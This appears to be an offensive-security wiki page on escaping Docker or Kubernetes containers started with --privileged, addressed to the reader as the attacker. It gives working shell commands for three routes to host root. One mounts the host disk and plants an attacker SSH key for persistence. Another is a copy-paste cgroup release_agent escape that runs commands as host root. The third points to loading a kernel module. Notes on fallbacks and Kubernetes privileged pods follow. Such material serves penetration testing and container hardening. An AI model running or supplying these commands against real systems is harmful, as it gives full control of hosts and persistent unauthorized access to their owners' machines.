---
title: "Privileged flag: full host access from a --privileged container"
description: "Escaping a container run with --privileged, which grants every Linux capability, access to every host device under /dev, an unconfined seccomp and AppArmor profile, and a writable sysfs and cgroupfs. Three concrete routes to the host: mounting the host disk, the cgroup release_agent handler, and loading a kernel module."
keywords:
  - privileged container
  - docker privileged
  - container escape
  - host disk mount
  - release_agent
---

# Privileged flag

`--privileged` is the single most common container escape, and the easiest. It removes almost every boundary at once: the container receives the full capability set, a device cgroup rule of `a *:* rwm` (so every host device node under `/dev` is usable), an unconfined seccomp profile and AppArmor profile, and read-write `/sys` and cgroupfs. From inside, you are effectively root on the host; the only question is which of several routes you take out.

Confirm it in one line, then pick a route:

```bash
grep -q $'\t'0000003fffffffff /proc/self/status 2>/dev/null || grep CapEff /proc/self/status
ls /dev/sda* /dev/nvme* 2>/dev/null       # host block devices are visible under --privileged
```

## Route 1: mount the host disk

The fastest interactive route. With full device access you simply mount the host's root block device and chroot into it:

```bash
# Identify the host root filesystem device
fdisk -l 2>/dev/null | grep -E 'Linux|/dev'      # or: lsblk, cat /proc/partitions
# Mount it and become root on the host filesystem
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh
# From here, read/write any host file; drop an SSH key or systemd unit for persistence
echo 'ssh-ed25519 AAAA... attacker' >> /mnt/host/root/.ssh/authorized_keys
```

For LVM or encrypted roots the device is the mapper node (`/dev/mapper/...`); `lsblk -f` shows the filesystem and mountpoint to pick the right one.

## Route 2: cgroup release_agent

The most reliable non-interactive one-liner, independent of the disk layout. It works on cgroup v1 (present on most hosts, or mountable under `--privileged`). The kernel runs the `release_agent` program, in the host's namespaces as root, when the last task leaves a cgroup marked `notify_on_release`:

```bash
mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c && mkdir /tmp/c/x
echo 1 > /tmp/c/x/notify_on_release
# release_agent runs in the HOST mount namespace: locate this container's rootfs on the host
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
echo "$host/cmd" > /tmp/c/release_agent
printf '#!/bin/sh\nid > %s/out 2>&1\n' "$host" > /cmd && chmod +x /cmd
# Fire it: a task that enters then exits the cgroup empties it
sh -c "echo \$\$ > /tmp/c/x/cgroup.procs"
cat /out        # output of id, run as root on the host
```

The `upperdir` trick is needed because `release_agent` executes in the host's filesystem view, so the helper must be at a path the host can resolve. See [cgroups release_agent](cgroups-release-agent.md) for the full technique and the cgroup v2 caveat.

## Route 3: load a kernel module

If you prefer ring-0 directly (useful when the disk mount is awkward or you want to disable defenses), the full capability set includes `CAP_SYS_MODULE`; build and insert a module whose init spawns a host process. See [CAP_SYS_MODULE](capability-abuse/cap-sys-module.md).

## Exploitation notes

- `--privileged` is a superset: anything under [Capability abuse](capability-abuse/index.md), [Device access](device-access/index.md), and [cgroups release_agent](cgroups-release-agent.md) is available. Route 1 is quickest for a shell; route 2 is the most copy-pasteable and does not depend on knowing the disk device.
- On a cgroup-v2-only host (no v1 hierarchy to mount), route 2's `mount -t cgroup` fails; fall back to route 1 (disk) or route 3 (module). Check with `mount | grep cgroup2` and the absence of `release_agent` files.
- These routes run as real root on the host only when the container is not in a user namespace; `cat /proc/self/uid_map` showing `0 0 4294967295` confirms it, which is the default for rootful Docker and most Kubernetes pods.
- In Kubernetes this is `securityContext.privileged: true`; obtaining such a pod is [Pod creation to node](../../../orchestration/kubernetes/rbac-privilege-escalation/pod-creation-to-node.md), and the delivery view is [Privileged pod](../../../orchestration/kubernetes/pod-escape-to-node/privileged-pod.md).

## References

- [Docker: runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [man 7 cgroups](https://man7.org/linux/man-pages/man7/cgroups.7.html)
